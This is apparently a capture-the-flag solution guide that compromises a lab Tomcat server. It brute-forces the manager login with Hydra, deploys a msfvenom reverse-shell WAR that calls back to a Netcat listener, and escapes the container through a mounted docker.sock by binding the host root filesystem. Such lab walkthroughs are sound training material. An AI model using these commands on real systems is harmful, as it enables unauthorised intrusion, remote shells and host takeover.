# Let Loose the Logs of War

*Solution Guide*

## Overview

In *Let Loose the Logs of War* players are expected to exploit a webserver running in a Docker container and access the host file system.

## Question 1

*Enter Token 1 found in the / directory of the webserver container.*

Begin by browsing to the webserver at `http://web`. It may take a few minutes for the server to start. You are presented with the following page:

![Firefox on Kali showing the warlog log-viewer web app at 10.5.5.100/warlog/, with a Navigation panel listing the root folder "/" (length 4096) beside an empty "tabs" content pane.](img/img1.png "Webserver log-viewer landing page")

You can experiment with this page if you want, but it is just a log viewer and has no bearing on the challenge itself. Let's begin by trying to examine the host machine.

1. Open a terminal and run the following command to show open ports:

```bash
nmap -sV web
```

![Terminal output of "nmap -sV 10.5.5.100" showing port 22/tcp filtered ssh, port 80/tcp open running Apache httpd 2.4.59 (Debian), and port 8080/tcp open running Apache Tomcat 9.0.93.](img/img2.png "Nmap service scan of the webserver")

Apache Tomcat is running on port `8080` and an Apache web server is on `80`.

2. Browsing to `http://web:8080` shows a **HTTP Status 404 – Not Found** page. Let's try using DirBuster on the two ports:

```bash
dirb http://web
dirb http://web:8080
```

You'll see the **manager** page is accessible on port `8080`:

![Terminal output of "dirb http://10.5.5.100:8080" reporting one found path: http://10.5.5.100:8080/manager returning CODE:302, SIZE:0.](img/img3.png "Dirb discovers the /manager path on port 8080")

3. Browse to `http://web:8080/manager`. It looks like we need to log in.

![Browser HTTP Basic authentication dialog for 10.5.5.100:8080 reading "This site is asking you to sign in," with empty Username and Password fields and a Sign in button.](img/img4.png "Tomcat manager prompts for credentials")

4. We can try to brute-force the password using `Hydra` with `/home/user/wordlist.txt`. The challenge instructions say to use the login *admin*:

```bash
hydra -s 8080 -l admin -P /home/user/wordlist.txt web http-get /manager/html -m "/manager/html" -t 4
```

![Terminal output of the Hydra brute-force run against http-get /manager/html reporting "1 valid password found" with host: web, login: admin, password: transpire.](img/img5.png "Hydra recovers the admin password")

>**Note:** Your password will be different as it is randomized for each challenge launch.

5. Use the credentials to login. You can now access the **Tomcat Web Application Manager** page.

![The Tomcat Web Application Manager page showing a Message of OK, an Applications table listing the /manager and /warlog apps as running, and Deploy, Configuration, and Diagnostics sections below.](img/img6.png "Authenticated Tomcat Web Application Manager")

6. Look at the **WAR file to deploy** section -- we're interested in this section

![Close-up of the Tomcat manager Deploy section, showing the "Deploy directory or WAR file located on server" fields and, below, the "WAR file to deploy" area with a Browse button and Deploy button.](img/img7.png "WAR file to deploy section of the manager")

7. Let's generate a reverse shell with **msfvenom**:

The following command creates a file that attempts to reach back to your machine with an interactive shell. Your machine's IP address will be different for the `LHOST` setting. You can get your IP address using the command `ip a`.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.5.5.60 LPORT=9999 -f war > shell.war
```

![Terminal running the msfvenom command to build a java/jsp_shell_reverse_tcp payload with LHOST=10.5.5.100 LPORT=9999, reporting "Payload size: 1090 bytes" and "Final size of war file: 1090 bytes" written to shell.war.](img/img8.png "Generating the reverse-shell WAR with msfvenom")

8. Go back to the Tomcat Web Application Manager in the browser. In the **WAR file to deploy section**, select the **Browse** button, then navigate to and highlight your generated `.war` file and select **Open**. You will see the name of your file to the right of the **Browse** button.

![The manager's "WAR file to deploy" row after selection, showing the filename shell.war displayed to the right of the Browse button, above the Deploy button.](img/img9.png "shell.war selected and ready to deploy")

9. Before deploying the WAR file, open a Netcat listener on your machine. In the terminal, enter:

```bash
nc -klvp 9999
```

This opens a Netcat listener with these options:

- `-k` option keeps the listener open if it disconnects.
- `-l` option specifies that Netcat should listen for incoming connections. 
- `-p` specifies the port number (`9999` in our case, which we chose when making the WAR file) it should listen on.

![Terminal running "nc -klvp 9999" and reporting that it is listening on port 9999 as it waits for an incoming connection.](img/img10.png "Netcat listener waiting on port 9999")

10. Once the listener is open, click **Deploy** on the Tomcat Web Application Manager in the browser. You should see the **/shell** app now showing in the Applications section of the Tomcat Manager page.

![The same Netcat terminal still showing that it is listening on port 9999 while waiting for the deployed /shell app to call back.](img/img10.png "Listener open after deploying the /shell app")

11. Open the **/shell** link on the manager page. You will see a connection message in your listener window.

    >**Note:** If you need to re-upload the WAR (e.g., you used the wrong LHOST the first time), **undeploy the old `/shell` application first** using the "Undeploy" button in the manager, then upload the new WAR. Tomcat caches the compiled JSP from the first deployment and may not recompile it on a same-name redeploy. Alternatively, rename the new WAR (e.g., `shell2.war`) so it deploys as a separate application.

![The Netcat listener receiving the reverse shell, printing a "connect to 10.5.5.139 from (UNKNOWN) 10.5.5.100 52472" line after the inverse host lookup failed message.](img/img12.png "Reverse shell connects back to the listener")

12. Let's find out which user we are with the `whoami` command. Good! We're `root`, but that's not normal...right? We know from reading the challenge question that we are in web server container.

![In the reverse shell, the "whoami" command is typed and returns "root," confirming the shell runs as the root user inside the container.](img/img13.png "whoami confirms root inside the container")

13. So, to get Token 1, enter `ls /` to list the contents of the root folder... and there is Token 1.

![Output of "ls /" in the reverse shell listing the container root directory, where TOKEN1.txt appears alongside the standard bin, boot, dev, etc, home, and other directories.](img/img14.png "TOKEN1.txt found in the container root")

14. Enter `cat /TOKEN1.txt` to get the answer to question 1.

>Remember, your answer will be different because the tokens are randomized per challenge launch.

![Output of "cat /TOKEN1.txt" in the reverse shell printing "TOKEN 1: 1420096346".](img/img15.png "Reading the Token 1 value")

## Question 2

*Enter Token 2 found in the /home/user/ directory of the host system.*

1. Since we're in a container, we can explore vulnerabilities. The administrator mistakenly mounted `docker.sock` in the container, allowing access to the root file system. Confirm the mount by entering:

```bash
ls /var/run/docker.sock
```

![Output of "ls /var/run/docker.sock" echoing back "/var/run/docker.sock," confirming the Docker socket is mounted inside the container.](img/img16.png "Confirming the mounted Docker socket")

2. List the images on the host you have available (since this is an isolated environment without access to the Docker repository) with this command:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json | awk '{gsub(/},\s*{/, "}\n{\n"); gsub(/^\[\s*/, "[\n"); gsub(/\s*\]$/, "\n]"); gsub(/,\s*$/, "\n"); print}'
```

>The `| awk...` part is not necessary, but it makes the output a little more readable.

![JSON output from the Docker socket images/json endpoint, formatted into blocks that show three installed Tomcat images tagged tomcat:latest, tomcat:10, and tomcat:9 with their image IDs and sizes.](img/img17.png "Listing host Docker images via the socket")

3. Looking at the output, we can see there are three versions of Tomcat images installed on the system. We can use the Docker socket to create a container to display the contents of the folders on the host.

```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
   -d '{
     "Image": "tomcat:latest",
     "Cmd": ["/bin/sh", "-c", "ls /host/home/user/"],
     "HostConfig": {
       "Binds": ["/:/host"]
     }
   }' http://localhost/containers/create
```

This outputs a container `Id` for the container you just created:

![The curl containers/create POST request bound with "/:/host" and running "ls /host/home/user/," returning a JSON response with the new container Id "02a5d7e0420b83ae2699a91c91d726c0b96ca01eee2178f25edd2d382deeb6d9" and empty Warnings.](img/img18.png "Creating a container that lists the host home directory")

4. Let's start our container. Your command will be different than the command below. Be sure to use the container `Id` output from the previous command.

```bash
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/02a5d7e0420b83ae2699a91c91d726c0b96ca01eee2178f25edd2d382deeb6d9/start
```

5. Now we need to view the Docker logs to get the output from our `ls` command in the container we just built (again, note that your container `Id`will be different):

```bash
curl --unix-socket /var/run/docker.sock "http://localhost/containers/02a5d7e0420b83ae2699a91c91d726c0b96ca01eee2178f25edd2d382deeb6d9/logs?stdout=true"
```

![The curl containers/logs output from the created container, listing the host's /home/user contents including autopsy, .bash_history, Desktop, Documents, Downloads, and TOKEN2.txt among others.](img/img19.png "Container logs reveal TOKEN2.txt on the host")

6. We see the token there, but we need the contents of the file. To get that, let's build a new container with the `cat` command in place of `ls`:

```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
   -d '{
     "Image": "tomcat:latest",
     "Cmd": ["/bin/sh", "-c", "cat /host/home/user/TOKEN2.txt"],
     "HostConfig": {
       "Binds": ["/:/host"]
     }
   }' http://localhost/containers/create
```

Again, your `Id` will be different.

![A second curl containers/create POST request, this time running "cat /host/home/user/TOKEN2.txt" with the "/:/host" bind, returning the new container Id "e5fb1bb516e59fd223c4aa5bfc6f5fdafbe47babb8f105327cd3c1d68e7662dc".](img/img20.png "Creating a container that reads TOKEN2.txt")

7. Run the new container (remembering, of course, that your `Id` is different than what is presented in this solution guide).

```bash
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/e5fb1bb516e59fd223c4aa5bfc6f5fdafbe47babb8f105327cd3c1d68e7662dc/start
```

8. Finally, let's get the logs from the new container and get our token.

```bash
curl --unix-socket /var/run/docker.sock "http://localhost/containers/e5fb1bb516e59fd223c4aa5bfc6f5fdafbe47babb8f105327cd3c1d68e7662dc/logs?stdout=true"
```

![The curl containers/start and containers/logs commands for the second container, whose log output prints the Token 2 value "456758895".](img/img21.png "Reading the Token 2 value from the container logs")

Your answer will be different because the tokens are randomized per challenge launch.
